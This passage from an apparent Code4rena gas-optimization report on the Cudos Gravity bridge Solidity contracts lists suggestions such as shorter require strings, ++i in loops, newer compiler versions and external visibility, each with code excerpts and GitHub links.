solidity/contracts/Gravity.sol   #3\n\n263   \t\tfor (uint256 i = 0; i < _newValset.validators.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L263\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n453   \t\t\t\tfor (uint256 i = 0; i < _amounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L453\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n568   \t\tfor (uint256 i = 0; i < _args.transferAmounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L568\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n579   \t\tfor (uint256 i = 0; i < _args.feeAmounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L579\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n660   \t\tfor (uint256 i = 0; i < _powers.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L660\n\n### 4. `require()`/`revert()` strings longer than 32 bytes cost extra gas\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n117   \t\t require(\n118               whitelisted[msg.sender] || cudosAccessControls.hasAdminRole(msg.sender) ,\n119               \"The caller is not whitelisted for this operation\"\n120           );\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L117-L120\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n238   \t\t\t\trequire(\n239   \t\t\t\t\tverifySig(_currentValidators[i], _theHash, _v[i], _r[i], _s[i]),\n240   \t\t\t\t\t\"Validator signature does not match.\"\n241   \t\t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L238-L241\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n254   \t\trequire(\n255   \t\t\tcumulativePower > _powerThreshold,\n256   \t\t\t\"Submitted validator set signatures do not have enough power.\"\n257   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L254-L257\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n289   \t\trequire(\n290   \t\t\t_newValset.valsetNonce > _currentValset.valsetNonce,\n291   \t\t\t\"New valset nonce must be greater than the current nonce\"\n292   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L289-L292\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n310   \t\trequire(\n311   \t\t\tmakeCheckpoint(_currentValset, state_gravityId) == state_lastValsetCheckpoint,\n312   \t\t\t\"Supplied current validators and powers do not match checkpoint.\"\n313   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L310-L313\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n315   \t\trequire(\n316   \t\t\tisOrchestrator(_currentValset, msg.sender),\n317   \t\t\t\"The sender of the transaction is not validated orchestrator\"\n318   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L315-L318\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n384   \t\t\trequire(\n385   \t\t\t\tstate_lastBatchNonces[_tokenContract] < _batchNonce,\n386   \t\t\t\t\"New batch nonce must be greater than the current nonce\"\n387   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L384-L387\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #8\n\n390   \t\t\trequire(\n391   \t\t\t\tblock.number < _batchTimeout,\n392   \t\t\t\t\"Batch timeout must be greater than the current block height\"\n393   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L390-L393\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #9\n\n405   \t\t\trequire(\n406   \t\t\t\tmakeCheckpoint(_currentValset, state_gravityId) == state_lastValsetCheckpoint,\n407   \t\t\t\t\"Supplied current validators and powers do not match checkpoint.\"\n408   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L405-L408\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #10\n\n416   \t\t\trequire(\n417   \t\t\t\tisOrchestrator(_currentValset, msg.sender),\n418   \t\t\t\t\"The sender of the transaction is not validated orchestrator\"\n419   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L416-L419\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #11\n\n494   \t\t\trequire(\n495   \t\t\t\tstate_invalidationMapping[_args.invalidationId] < _args.invalidationNonce,\n496   \t\t\t\t\"New invalidation nonce must be greater than the current nonce\"\n497   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L494-L497\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #12\n\n509   \t\t\trequire(\n510   \t\t\t\tmakeCheckpoint(_currentValset, state_gravityId) == state_lastValsetCheckpoint,\n511   \t\t\t\t\"Supplied current validators and powers do not match checkpoint.\"\n512   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L509-L512\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #13\n\n515   \t\t\trequire(\n516   \t\t\t\t_args.transferAmounts.length == _args.transferTokenContracts.length,\n517   \t\t\t\t\"Malformed list of token transfers\"\n518   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L515-L518\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #14\n\n525   \t\t\trequire(\n526   \t\t\t\tisOrchestrator(_currentValset, msg.sender),\n527   \t\t\t\t\"The sender of the transaction is not validated orchestrator\"\n528   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L525-L528\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #15\n\n655   \t\trequire(address(_cudosAccessControls) != address(0), \"Access control contract address is incorrect\");\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L655\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #16\n\n666   \t\trequire(\n667   \t\t\tcumulativePower > _powerThreshold,\n668   \t\t\t\"Submitted validator set signatures do not have enough power.\"\n669   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L666-L669\n\n### 5. Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nUse `uint256(1)` and `uint256(2)` for true/false\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n65   \tmapping(address => bool) public whitelisted;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L65\n\n### 6. Use a more recent version of solidity\nUse a solidity version of at least 0.8.0 to get overflow protection without `SafeMath`\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol   #1\n\n1   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol#L1\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n1   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L1\n\n### 7. It costs more gas to initialize variables to zero than to let the default of zero be applied\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n128   \t\t for (uint256 i = 0; i < _users.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L128\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n231   \t\tuint256 cumulativePower = 0;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L231\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n233   \t\tfor (uint256 i = 0; i < _currentValidators.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L233\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n263   \t\tfor (uint256 i = 0; i < _newValset.validators.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L263\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n453   \t\t\t\tfor (uint256 i = 0; i < _amounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L453\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n568   \t\tfor (uint256 i = 0; i < _args.transferAmounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L568\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n579   \t\tfor (uint256 i = 0; i < _args.feeAmounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L579\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #8\n\n659   \t\tuint256 cumulativePower = 0;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L659\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #9\n\n660   \t\tfor (uint256 i = 0; i < _powers.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L660\n\n### 8. `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too)\nSaves 6 gas _PER LOOP_\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n128   \t\t for (uint256 i = 0; i < _users.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L128\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n233   \t\tfor (uint256 i = 0; i < _currentValidators.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L233\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n263   \t\tfor (uint256 i = 0; i < _newValset.validators.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L263\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n453   \t\t\t\tfor (uint256 i = 0; i < _amounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L453\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n568   \t\tfor (uint256 i = 0; i < _args.transferAmounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L568\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n579   \t\tfor (uint256 i = 0; i < _args.feeAmounts.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L579\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n660   \t\tfor (uint256 i = 0; i < _powers.length; i++) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L660\n\n### 9. Splitting `require()` statements that use `&&` saves gas\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n301   \t\trequire(\n302   \t\t\t_currentValset.validators.length == _currentValset.powers.length &&\n303   \t\t\t\t_currentValset.validators.length == _v.length &&\n304   \t\t\t\t_currentValset.validators.length == _r.length &&\n305   \t\t\t\t_currentValset.validators.length == _s.length,\n306   \t\t\t\"Malformed current validator set\"\n307   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L301-L307\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n396   \t\t\trequire(\n397   \t\t\t\t_currentValset.validators.length == _currentValset.powers.length &&\n398   \t\t\t\t\t_currentValset.validators.length == _v.length &&\n399   \t\t\t\t\t_currentValset.validators.length == _r.length &&\n400   \t\t\t\t\t_currentValset.validators.length == _s.length,\n401   \t\t\t\t\"Malformed current validator set\"\n402   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L396-L402\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n411   \t\t\trequire(\n412   \t\t\t\t_amounts.length == _destinations.length && _amounts.length == _fees.length,\n413   \t\t\t\t\"Malformed batch of transactions\"\n414   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L411-L414\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n500   \t\t\trequire(\n501   \t\t\t\t_currentValset.validators.length == _currentValset.powers.length &&\n502   \t\t\t\t\t_currentValset.validators.length == _v.length &&\n503   \t\t\t\t\t_currentValset.validators.length == _r.length &&\n504   \t\t\t\t\t_currentValset.validators.length == _s.length,\n505   \t\t\t\t\"Malformed current validator set\"\n506   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L500-L506\n\n### 10. Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nUse a larger size then downcast where needed\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol   #1\n\n11   \t\tuint8 _decimals\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol#L11\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n91   \t\tuint8 _decimals,\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L91\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n178   \t\tuint8 _v,\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L178\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n615   \t\tuint8 _decimals\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L615\n\n### 11. Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\nSaves deployment costs\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n666   \t\trequire(\n667   \t\t\tcumulativePower > _powerThreshold,\n668   \t\t\t\"Submitted validator set signatures do not have enough power.\"\n669   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L666-L669\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n396   \t\t\trequire(\n397   \t\t\t\t_currentValset.validators.length == _currentValset.powers.length &&\n398   \t\t\t\t\t_currentValset.validators.length == _v.length &&\n399   \t\t\t\t\t_currentValset.validators.length == _r.length &&\n400   \t\t\t\t\t_currentValset.validators.length == _s.length,\n401   \t\t\t\t\"Malformed current validator set\"\n402   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L396-L402\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n405   \t\t\trequire(\n406   \t\t\t\tmakeCheckpoint(_currentValset, state_gravityId) == state_lastValsetCheckpoint,\n407   \t\t\t\t\"Supplied current validators and powers do not match checkpoint.\"\n408   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L405-L408\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n416   \t\t\trequire(\n417   \t\t\t\tisOrchestrator(_currentValset, msg.sender),\n418   \t\t\t\t\"The sender of the transaction is not validated orchestrator\"\n419   \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L416-L419\n\n### 12. Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n124   \tfunction manageWhitelist(\n125   \t\taddress[] memory _users,\n126   \t\tbool _isWhitelisted\n127   \t\t) public onlyWhitelisted {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L124-L127\n\n### 13. `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public` and can save gas by doing so.\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n124   \tfunction manageWhitelist(\n125   \t\taddress[] memory _users,\n126   \t\tbool _isWhitelisted\n127   \t\t) public onlyWhitelisted {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L124-L127\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n140   \tfunction testMakeCheckpoint(ValsetArgs memory _valsetArgs, bytes32 _gravityId) public pure {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L140\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n144   \tfunction testCheckValidatorSignatures(\n145   \t\taddress[] memory _currentValidators,\n146   \t\tuint256[] memory _currentPowers,\n147   \t\tuint8[] memory _v,\n148   \t\tbytes32[] memory _r,\n149   \t\tbytes32[] memory _s,\n150   \t\tbytes32 _theHash,\n151   \t\tuint256 _powerThreshold\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L144-L151\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n166   \tfunction lastBatchNonce(address _erc20Address) public view returns (uint256) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L166\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n170   \tfunction lastLogicCallNonce(bytes32 _invalidation_id) public view returns (uint256) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L170\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n276   \tfunction updateValset(\n277   \t\t// The new version of the validator set\n278   \t\tValsetArgs memory _newValset,\n279   \t\t// The current validators that approve the change\n280   \t\tValsetArgs memory _currentValset,\n281   \t\t// These are arrays of the parts of the current validator's signatures\n282   \t\tuint8[] memory _v,\n283   \t\tbytes32[] memory _r,\n284   \t\tbytes32[] memory _s\n285   \t) public nonReentrant {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L276-L285\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n364   \tfunction submitBatch (\n365   \t\t// The validators that approve the batch\n366   \t\tValsetArgs memory _currentValset,\n367   \t\t// These are arrays of the parts of the validators signatures\n368   \t\tuint8[] memory _v,\n369   \t\tbytes32[] memory _r,\n370   \t\tbytes32[] memory _s,\n371   \t\t// The batch of transactions\n372   \t\tuint256[] memory _amounts,\n373   \t\taddress[] memory _destinations,\n374   \t\tuint256[] memory _fees,\n375   \t\tuint256 _batchNonce,\n376   \t\taddress _tokenContract,\n377   \t\t// a block height beyond which this batch is not valid\n378   \t\t// used to provide a fee-free timeout\n379   \t\tuint256 _batchTimeout\n380   \t) public nonReentrant {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L364-L380\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #8\n\n479   \tfunction submitLogicCall(\n480   \t\t// The validators that approve the call\n481   \t\tValsetArgs memory _currentValset,\n482   \t\t// These are arrays of the parts of the validators signatures\n483   \t\tuint8[] memory _v,\n484   \t\tbytes32[] memory _r,\n485   \t\tbytes32[] memory _s,\n486   \t\tLogicCallArgs memory _args\n487   \t) public nonReentrant {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L479-L487\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #9\n\n595   \tfunction sendToCosmos(\n596   \t\taddress _tokenContract,\n597   \t\tbytes32 _destination,\n598   \t\tuint256 _amount\n599   \t) public nonReentrant  {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L595-L599\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #10\n\n611   \tfunction deployERC20(\n612   \t\tstring memory _cosmosDenom,\n613   \t\tstring memory _name,\n614   \t\tstring memory _symbol,\n615   \t\tuint8 _decimals\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L611-L615\n\n### 14. Return from function rather than breaking out of loop\nUsing `return` rather than `break` saves gas because the `require()` outside of the `for`-loop has the same condition that caused the loop to be broken out of\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n246  \t\t\t\t// Break early to avoid wasting gas\n247  \t\t\t\tif (cumulativePower > _powerThreshold) {\n248  \t\t\t\t\tbreak;\n249  \t\t\t\t}\n250  \t\t\t}\n251  \t\t}\n252  \n253  \t\t// Check that there was enough power\n254  \t\trequire(\n255  \t\t\tcumulativePower > _powerThreshold,\n256  \t\t\t\"Submitted validator set signatures do not have enough power.\"\n257  \t\t);\n258  \t\t// Success\n259  \t}\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L246-L259\n\n### 15. `require()` or `revert()` statements that check input arguments should be at the top of the function\nChecks that involve constants should come before checks that involve state variables\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n411  \t\t\trequire(\n412  \t\t\t\t_amounts.length == _destinations.length && _amounts.length == _fees.length,\n413  \t\t\t\t\"Malformed batch of transactions\"\n414  \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L411-L414\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n514  \t\t\t// Check that the token transfer list is well-formed\n515  \t\t\trequire(\n516  \t\t\t\t_args.transferAmounts.length == _args.transferTokenContracts.length,\n517  \t\t\t\t\"Malformed list of token transfers\"\n518  \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L514-L518\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n520  \t\t\t// Check that the fee list is well-formed\n521  \t\t\trequire(\n522  \t\t\t\t_args.feeAmounts.length == _args.feeTokenContracts.length,\n523  \t\t\t\t\"Malformed list of fees\"\n524  \t\t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L520-L524\n\n### 16. Remove test code to save deployment gas\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n138  \t// TEST FIXTURES\n139  \t// These are here to make it easier to measure gas usage. They should be removed before production\n140  \tfunction testMakeCheckpoint(ValsetArgs memory _valsetArgs, bytes32 _gravityId) public pure {\n141  \t\tmakeCheckpoint(_valsetArgs, _gravityId);\n142  \t}\n143  \n144  \tfunction testCheckValidatorSignatures(\n145  \t\taddress[] memory _currentValidators,\n146  \t\tuint256[] memory _currentPowers,\n147  \t\tuint8[] memory _v,\n148  \t\tbytes32[] memory _r,\n149  \t\tbytes32[] memory _s,\n150  \t\tbytes32 _theHash,\n151  \t\tuint256 _powerThreshold\n152  \t) public pure {\n153  \t\tcheckValidatorSignatures(\n154  \t\t\t_currentValidators,\n155  \t\t\t_currentPowers,\n156  \t\t\t_v,\n157  \t\t\t_r,\n158  \t\t\t_s,\n159  \t\t\t_theHash,\n160  \t\t\t_powerThreshold\n161  \t\t);\n162  \t}\n163  \n164  \t// END TEST FIXTURES\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L138-L164\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cudos-findings",
      "repo": "https://github.com/code-423n4/2022-05-cudos-findings",
      "url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/147"
    }
  },
  {
    "title": "QA Report",
